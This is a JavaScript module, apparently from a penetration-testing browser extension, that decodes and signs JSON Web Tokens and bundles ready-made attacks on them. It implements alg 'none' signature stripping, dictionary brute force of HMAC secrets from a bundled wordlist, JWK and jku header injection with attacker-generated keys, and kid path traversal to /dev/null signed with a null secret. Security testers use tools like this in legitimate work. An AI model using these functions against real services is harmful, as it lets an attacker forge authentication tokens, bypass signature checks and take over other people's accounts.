/**
 * JWT 编解码与常见攻击链
 * 依赖全局 jose（lib/jose.bundle.js）
 */
var StiffEyesJwt = (function () {
  'use strict';

  var ALGS = [
    'HS256', 'HS384', 'HS512',
    'RS256', 'RS384', 'RS512',
    'ES256', 'ES384', 'ES512',
    'PS256', 'PS384', 'PS512'
  ];

  var ALG_DESC = {
    HS256: 'HMACSHA256(header.payload, secret)',
    HS384: 'HMACSHA384(header.payload, secret)',
    HS512: 'HMACSHA512(header.payload, secret)',
    RS256: 'RSASHA256(header.payload, PUBLIC, PRIVATE)',
    RS384: 'RSASHA384(header.payload, PUBLIC, PRIVATE)',
    RS512: 'RSASHA512(header.payload, PUBLIC, PRIVATE)',
    ES256: 'ECDSASHA256(header.payload, PUBLIC, PRIVATE)',
    ES384: 'ECDSASHA384(header.payload, PUBLIC, PRIVATE)',
    ES512: 'ECDSASHA512(header.payload, PUBLIC, PRIVATE)',
    PS256: 'RSAPSSSHA256(header.payload, PUBLIC, PRIVATE)',
    PS384: 'RSAPSSSHA384(header.payload, PUBLIC, PRIVATE)',
    PS512: 'RSAPSSSHA512(header.payload, PUBLIC, PRIVATE)'
  };

  var SAMPLE =
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.CQ13a7rjONXqoy8ARzP8oyKBI2PMNl7z76FCvuKVxo0';

  var keyPair = { pub: null, priv: null };
  var secretsCache = null;

  function joseApi() {
    if (typeof jose === 'undefined') {
      throw new Error('jose 库未加载');
    }
    return jose;
  }

  function base64UrlEncode(str) {
    var base64 = btoa(unescape(encodeURIComponent(str)));
    return base64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  }

  function base64UrlDecode(segment) {
    var s = String(segment || '').replace(/-/g, '+').replace(/_/g, '/');
    while (s.length % 4) s += '=';
    var bin = atob(s);
    var bytes = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    return new TextDecoder().decode(bytes);
  }

  function parseJson(text, label) {
    try {
      return JSON.parse(text);
    } catch (e) {
      throw new Error((label || 'JSON') + ' 格式无效: ' + e.message);
    }
  }

  function decodeParts(token) {
    var jwt = String(token || '').trim().split('.');
    if (jwt.length > 3) throw new Error('JWT 格式无效');
    var out = { header: '', payload: '', signature: '', alg: '' };
    if (jwt[0]) {
      var h = parseJson(base64UrlDecode(jwt[0]), 'Header');
      out.header = JSON.stringify(h, null, 2);
      out.alg = h.alg || '';
    }
    if (jwt[1]) {
      out.payload = JSON.stringify(parseJson(base64UrlDecode(jwt[1]), 'Payload'), null, 2);
    }
    if (jwt[2]) out.signature = jwt[2];
    return out;
  }

  function buildUnsigned(headerText, payloadText, signature) {
    var t = '';
    if (headerText) {
      t += base64UrlEncode(JSON.stringify(parseJson(headerText, 'Header')));
    }
    if (payloadText) {
      t += '.' + base64UrlEncode(JSON.stringify(parseJson(payloadText, 'Payload')));
    }
    if (headerText && payloadText && signature) {
      t += '.' + signature;
    }
    return t;
  }

  async function importPrivateJwk(jwk, alg) {
    var api = joseApi();
    return api.importJWK(jwk, alg);
  }

  async function encodeToken(state) {
    var headerText = state.header;
    var payloadText = state.payload;
    var alg = state.alg;
    var secret = state.secret || '';

    if (!headerText || !payloadText) {
      return buildUnsigned(headerText, payloadText, state.signature);
    }

    var headerObj = parseJson(headerText, 'Header');
    var payloadObj = parseJson(payloadText, 'Payload');
    var api = joseApi();

    if (alg.indexOf('HS') === 0) {
      if (!secret) return buildUnsigned(headerText, payloadText, state.signature);
      var key = new TextEncoder().encode(secret);
      return new api.SignJWT(payloadObj).setProtectedHeader(headerObj).sign(key);
    }

    if (keyPair.priv) {
      var privKey = await importPrivateJwk(keyPair.priv, alg);
      return new api.SignJWT(payloadObj)
        .setProtectedHeader(headerObj)
        .sign(privKey);
    }

    return buildUnsigned(headerText, payloadText, state.signature);
  }

  async function generateJwk(alg) {
    if (alg.indexOf('HS') === 0) {
      throw new Error('仅 RSA / EC / PSS 算法支持 JWK 生成');
    }
    var api = joseApi();
    var pair = await api.generateKeyPair(alg, { extractable: true });
    var publicJWK = await api.exportJWK(pair.publicKey);
    var privateJWK = await api.exportJWK(pair.privateKey);
    var pub = JSON.parse(JSON.stringify(publicJWK));
    pub.kid = crypto.randomUUID();
    keyPair = {
      pub: pub,
      priv: JSON.parse(JSON.stringify(privateJWK))
    };
    return keyPair;
  }

  async function loadPresetKeys(alg) {
    var base = chrome.runtime.getURL('lib/jwt-keys/' + alg + '/');
    var privRes = await fetch(base + 'key.json');
    var pubRes = await fetch(base + 'exploit.json');
    if (!privRes.ok || !pubRes.ok) throw new Error('无法加载 ' + alg + ' 预设密钥');
    keyPair.priv = await privRes.json();
    var exploit = await pubRes.json();
    keyPair.pub = exploit.keys[0];
    return keyPair;
  }

  async function bruteForce(token, onProgress) {
    var api = joseApi();
    if (!secretsCache) {
      var url = chrome.runtime.getURL('lib/jwt.secrets.list');
      var res = await fetch(url);
      if (!res.ok) throw new Error('密钥字典加载失败');
      secretsCache = (await res.text())
        .split('\n')
        .map(function (k) { return k.trim(); })
        .filter(Boolean);
    }
    var keys = secretsCache;
    var batchSize = 20;
    var tested = 0;
    for (var i = 0; i < keys.length; i += batchSize) {
      var batch = keys.slice(i, i + batchSize);
      var results = await Promise.all(
        batch.map(function (k) {
          return api
            .jwtVerify(token, new TextEncoder().encode(k))
            .then(function () { return k; })
            .catch(function () { return null; });
        })
      );
      tested += batch.length;
      if (onProgress) onProgress(tested, keys.length);
      var found = results.find(Boolean);
      if (found) return found;
    }
    return null;
  }

  function clearKeyPair() {
    keyPair = { pub: null, priv: null };
  }

  return {
    ALGS: ALGS,
    ALG_DESC: ALG_DESC,
    SAMPLE: SAMPLE,

    getAlgDescription: function (alg) {
      return ALG_DESC[alg] || '';
    },

    decode: decodeParts,

    encode: encodeToken,

    noneAttack: function (headerText) {
      var h = parseJson(headerText, 'Header');
      h.alg = 'none';
      return JSON.stringify(h, null, 2);
    },

    noSignResult: function (headerText, payloadText) {
      var h = parseJson(headerText, 'Header');
      h.alg = 'none';
      var headerB64 = base64UrlEncode(JSON.stringify(h));
      var payloadB64 = base64UrlEncode(JSON.stringify(parseJson(payloadText, 'Payload')));
      return headerB64 + '.' + payloadB64 + '.';
    },

    bruteForce: bruteForce,

    generateJwk: generateJwk,
    loadPresetKeys: loadPresetKeys,
    getKeyPair: function () { return keyPair; },
    clearKeyPair: clearKeyPair,

    jwkInjectionHeader: function (headerText, alg, pair) {
      var h = parseJson(headerText, 'Header');
      h.alg = alg;
      h.typ = 'JWT';
      h.jwk = pair.pub;
      h.kid = pair.pub.kid;
      return JSON.stringify(h, null, 2);
    },

    jkuInjectionHeader: function (headerText, alg, pair, jkuUrl) {
      var h = parseJson(headerText, 'Header');
      h.alg = alg;
      h.typ = 'JWT';
      h.kid = pair.pub.kid;
      h.jku = jkuUrl;
      return JSON.stringify(h, null, 2);
    },

    kidPathHeader: function (headerText) {
      var h = parseJson(headerText, 'Header');
      h.kid = '../../../../../../../../../dev/null';
      return JSON.stringify(h, null, 2);
    },

    kidPathSign: async function (headerText, payloadText) {
      var api = joseApi();
      var secret = new TextEncoder().encode(atob('AA=='));
      return new api.SignJWT(parseJson(payloadText, 'Payload'))
        .setProtectedHeader(parseJson(headerText, 'Header'))
        .sign(secret);
    },

    defaultJkuUrl: function (alg) {
      return chrome.runtime.getURL('lib/jwt-keys/' + alg + '/exploit.json');
    }
  };
})();
